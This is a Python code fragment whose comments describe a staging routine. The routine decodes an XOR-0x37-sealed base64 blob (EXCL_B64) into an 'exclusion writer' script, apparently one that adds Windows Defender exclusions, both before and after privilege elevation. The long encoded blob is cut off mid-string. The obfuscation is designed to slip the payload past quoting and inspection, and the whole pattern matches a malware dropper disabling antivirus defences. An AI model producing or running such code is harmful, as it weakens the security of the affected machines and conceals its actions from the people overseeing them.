# r1.1.2/r78: the standalone exclusion writer is exclusions.py (repo mirror);
# it rides here as xor(0x37)-sealed base64 (EXCL_B64 below) and BOTH roads
# (the un-elevated pre-lift materialize + _run_stage_now) decode it into a
# byte-exact file, immune to quoting/escaping layers.

EXCL_B64 = "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